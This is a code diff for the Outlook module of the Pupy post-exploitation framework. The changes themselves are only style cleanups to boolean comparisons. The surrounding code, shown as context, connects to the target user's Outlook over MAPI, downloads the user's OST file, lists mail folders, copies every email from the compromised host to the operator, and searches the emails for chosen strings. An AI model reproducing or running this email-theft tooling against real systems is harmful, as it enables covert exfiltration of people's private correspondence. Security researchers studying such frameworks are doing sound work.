@@ -42,10 +42,10 @@ class Outlook(PupyModule):
         if not os.path.exists(self.localFolder):
             self.info("Creating the {0} folder locally".format(self.localFolder))
             os.makedirs(self.localFolder)
-        if args.folderId != None:
+        if args.folderId is not None:
             self.warning('Notice the folder Id option will be used and the default folder option will be disabled')
         outlook = self.client.conn.modules['outlook'].outlook(folderIndex=self.OL_DEFAULT_FOLDERS[args.outlookFolder], folderId=args.folderId, msgSaveType=args.msgSaveType)
-        if args.downloadOST == True:
+        if args.downloadOST:
             self.success("Trying to download Outlook OST file of the targeted current user")
             paths = outlook.getPathToOSTFiles()
             if len(paths)>0:
@@ -55,9 +55,9 @@ class Outlook(PupyModule):
                 self.success("OST file downloaded from {0} to {1}".format(paths[0][1], localPath))
             else:
                 self.error("OST file not found or an error occured")
-        if outlook.outlookIsInstalled() == True:
+        if outlook.outlookIsInstalled():
             self.success("Outlook application seems to be installed on the target, trying to connect to MAPI...")
-            if outlook.connect() == True:
+            if outlook.connect():
                 self.success("Connected to outlook application trough MAPI")
             else:
                 self.error("Impossible to connect to outlook application trough MAPI. Abording!")
@@ -65,22 +65,22 @@ class Outlook(PupyModule):
         else:
             self.error("Outlook application doesn't seem to be installed on the target. Nothing to do. Cancelling!")
             return
-        if args.information == True:
+        if args.information:
             info = outlook.getInformation()
             for key, value in info.iteritems():
                 self.success("{0}: {1}".format(key, value))
-        if args.foldersAndSubFolders == True:
+        if args.foldersAndSubFolders:
             self.success("Outlook folders and subfolders:")
             foldersAndSubFolders = outlook.getAllFolders()
             for i,folder in enumerate(foldersAndSubFolders):
                 print "{0}: {1}".format(i, folder.encode('utf-8'))
                 for j,subFolder in enumerate(foldersAndSubFolders[folder]):
                     print "  {0}.{1}: {2} (id: {3})".format(i, j, subFolder.encode('utf-8'), foldersAndSubFolders[folder][subFolder].encode('utf-8'))
-        if args.numberOfEmails == True:
+        if args.numberOfEmails:
             self.success("Trying to get number of emails in the {0} folder".format(args.outlookFolder))
             nb = outlook.getNbOfEmails()
             self.success("Number of emails in the {0} folder: {1}".format(args.outlookFolder, nb))
-        if args.downloadAllEmails == True:
+        if args.downloadAllEmails:
             self.success("Trying to download all emails stored in the {0} folder".format(args.outlookFolder))
             nb = outlook.getNbOfEmails()
             if nb == 0:
@@ -93,7 +93,7 @@ class Outlook(PupyModule):
                 self.info("Downloading all emails")
                 for i, anEmail in enumerate(outlook.getEmails()):
                     aPathToMailFile, filename = outlook.getAMailFile(anEmail)
-                    self.success('Downloading email {0}/{1}...'.format(i+1 ,outlook.getNbOfEmails()))
+                    self.success('Downloading email {0}/{1}...'.format(i+1, outlook.getNbOfEmails()))
                     localPathToFile = os.path.join(self.localFolder, filename)
                     self.info("Downloading the file {0} to {1}".format(aPathToMailFile, localPathToFile))
                     download(self.client.conn, aPathToMailFile, localPathToFile)
@@ -101,7 +101,7 @@ class Outlook(PupyModule):
                     outlook.deleteTempMailFile(aPathToMailFile)
                 print "\n"
                 self.success("Download completed!")
-        if args.search == True:
+        if args.search:
             self.success("Searching '{0}' in emails stored in {1} folder...".format(args.strings, args.outlookFolder))
             localPathToFile = os.path.join(self.localFolder, "research.txt")
             emails = outlook.searchStringsInEmails(strings=args.strings, separator=',')
